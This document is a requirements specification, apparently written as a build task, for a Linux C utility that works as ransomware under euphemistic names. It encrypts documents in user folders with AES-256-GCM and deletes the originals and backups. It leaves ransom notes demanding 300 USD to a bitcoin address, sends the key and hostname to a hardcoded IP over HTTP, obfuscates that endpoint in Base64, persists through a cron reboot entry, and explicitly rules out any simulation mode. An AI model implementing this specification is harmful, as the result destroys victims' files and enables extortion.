REQ-001: The utility SHALL enumerate all filesystem objects recursively within the directories ~/Documentos_Teste, ~/Documentos, ~/Downloads, ~/Imagens, and /mnt using opendir/readdir.
REQ-002: The utility SHALL filter enumerated objects to those with file extensions .xlsx, .docx, .pdf, .txt, .csv, .jpg, .png, .db, .backup, .psd, .zip, and .rar.
REQ-003: Upon initialization of the main() function, the utility SHALL generate exactly 32 random bytes using RAND_bytes() from libcrypto to serve as the AES-256 session key.
REQ-004: The utility SHALL encode the 32-byte session key to Base64 using EVP_EncodeBlock().
REQ-005: The utility SHALL persist the Base64-encoded key to the file /tmp/.master.key in JSON format with the exact structure {"aes_key":"<base64>"} (no spaces), with file permissions set to 0600.
REQ-006: The utility SHALL pass the 32-byte session key as a const uint8_t* parameter to all transformation functions; the key SHALL NOT be regenerated within any function.
REQ-007: For each qualifying object, the utility SHALL generate a 12-byte nonce using RAND_bytes().
REQ-008: The utility SHALL transform each object using AES-256-GCM via EVP_CIPHER_CTX from libcrypto, producing ciphertext and a 16-byte GCM authentication tag.
REQ-009: The utility SHALL write each transformed object to a new file with the .PROCESSED suffix appended to the original extension (e.g., doc.pdf becomes doc.pdf.PROCESSED), with the file format: [12-byte nonce][ciphertext][16-byte GCM tag].
REQ-010: Prior to deletion, the utility SHALL overwrite the source object with zeros, then remove it using remove().
REQ-011: The utility SHALL generate a file named #_STATUS_NOTICE_#.txt in each directory where at least one file was transformed.
REQ-012: The content of each #_STATUS_NOTICE_#.txt file SHALL contain a request for 300 USD in payment service to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa and an instruction to contact via secure channel.
REQ-013: The utility SHALL read /tmp/.master.key using fopen/fread and extract the value of the "aes_key" field via manual JSON parsing using strstr and strchr.
REQ-014: The utility SHALL locate the key value by using strstr(buf, "\"aes_key\":\"") and advance the pointer by exactly strlen("\"aes_key\":\"") bytes (11 characters), then use strchr to locate the closing double quote; the parsed value SHALL be validated to have length greater than zero.
REQ-015: The utility SHALL obtain the hostname using gethostname().
REQ-016: The utility SHALL construct a JSON payload with format {"aes_key":"...","hostname":"..."} and transmit it via HTTP POST to http://10.254.19.73:8080/collect using libcurl with Content-Type: application/json.
REQ-017: Upon receiving an HTTP 200 response, the utility SHALL delete /tmp/.master.key using remove().
REQ-018: The utility SHALL read the current crontab using popen("crontab -l","r"). If an entry @reboot <path_to_binary> does not exist, the utility SHALL add it using popen("crontab -","w").
REQ-019: The utility SHALL scan all target directories and delete files with extensions .bak, .backup, and .old using remove().
REQ-020: The management endpoint URL and the payment identifier SHALL be stored as Base64-encoded char arrays in the source code and decoded at runtime by a custom base64_decode() function implemented within the same file.
REQ-021: The utility SHALL execute in the following order: (1) generate and save the AES key to /tmp/.master.key; (2) enumerate and filter target directories; (3) transform each qualifying file; (4) generate operational notices only in affected directories; (5) transmit the data; (6) perform automatic scheduling.
REQ-022: The utility SHALL use ONLY libc, libssl/libcrypto, and libcurl; no external dependencies beyond these SHALL be permitted.
REQ-023: The management endpoint IP SHALL be exactly 10.254.19.73; no substitution SHALL be made.
REQ-024: The utility SHALL compile without warnings using the command: gcc -O2 -o ferramenta de processamento main.c -lssl -lcrypto -lcurl
REQ-025: A Makefile SHALL be provided with a target 'all' for compilation and a target 'clean' to remove the binary and any .o files.
REQ-026: The utility SHALL NOT implement any dry_run, simulation, or printf operations that simulate actions without executing them.
REQ-027: When extracting the aes_key value, the pointer SHALL be advanced by exactly strlen("\"aes_key\":\"") bytes after the strstr result; no hardcoded offsets (e.g., += 10 or += 9) SHALL be used.
REQ-028: The utility SHALL validate that the extracted aes_key value has length greater than zero before constructing the transmission JSON payload.
